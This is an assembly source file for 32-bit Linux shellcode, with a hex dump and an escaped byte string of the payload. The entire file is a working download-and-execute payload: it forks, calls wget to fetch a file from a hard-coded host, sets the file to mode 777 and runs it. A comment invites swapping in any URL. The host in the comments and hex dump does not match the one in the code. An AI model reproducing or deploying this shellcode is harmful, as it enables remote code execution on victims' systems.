; Filename: downloadexec.nasm
; Author: Daniel Sauder
; Website: http://govolution.wordpress.com/
; Tested on: Ubuntu 12.04 / 32Bit
; License: http://creativecommons.org/licenses/by-sa/3.0/

; Shellcode:
; - download 192.168.2.222/x with wget
; - chmod x
; - execute x
; - x is an executable
; - length 108 bytes

; % xxd wget-original
;00000000: 31c0 b002 cd80 31db 39d8 742a 31c0 b007  1.....1.9.t*1...
;00000010: cd80 31c9 31c0 50b0 0f6a 7889 e331 c966  ..1.1.P..jx..1.f
;00000020: b9ff 01cd 8031 c050 6a78 89e3 5089 e253  .....1.Pjx..P..S
;00000030: 89e1 b00b cd80 6a0b 5899 5268 322f 2f78  ......j.X.Rh2//x
;00000040: 6832 2e32 3268 3136 382e 6831 3932 2e89  h2.22h168.h192..
;00000050: e152 6a74 682f 7767 6568 2f62 696e 682f  .Rjth/wgeh/binh/
;00000060: 7573 7289 e352 5153 89e1 cd80            usr..RQS....

; "\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74\x2a\x31\xc0\xb0\x07"
; "\xcd\x80\x31\xc9\x31\xc0\x50\xb0\x0f\x6a\x78\x89\xe3\x31\xc9\x66"
; "\xb9\xff\x01\xcd\x80\x31\xc0\x50\x6a\x78\x89\xe3\x50\x89\xe2\x53"
; "\x89\xe1\xb0\x0b\xcd\x80\x6a\x0b\x58\x99\x52\x68\x32\x2f\x2f\x78"
; "\x68\x32\x2e\x32\x32\x68\x31\x36\x38\x2e\x68\x31\x39\x32\x2e\x89"
; "\xe1\x52\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f"
; "\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";


BITS 32

global _start

section .text

_start:

    ;fork
    sub eax, eax
    add eax, 2
    int 0x80
    sub ebx,ebx
    cmp eax,ebx
    jz child
  
    ;wait(NULL)
    sub eax,eax
    add al, 7
    int 0x80
        
    ;chmod x
    sub ecx, ecx
    sub eax, eax
    push eax
    mov al, 0xf
    push 0x78
    mov ebx, esp
    sub ecx, ecx
    mov cx, 0x1ff
    int 0x80
    
    ;exec x
    sub eax, eax
    push eax
    push 0x78
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    ;mov al, 11
    add eax, 11
    int 0x80
    
child:
    ;download 192.168.2.222//x with wget
    push 0xb
    pop eax
    cdq
    push edx

    jmp url
one:
    pop esi
    mov ecx, esi

    push 0x74 ;t
    push 0x6567772f ;egw/
    push 0x6e69622f ;nib/
    push 0x7273752f ;rsu/
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80

url:
    call one
    db "192.168.10.10/x" ;; change this to whatever

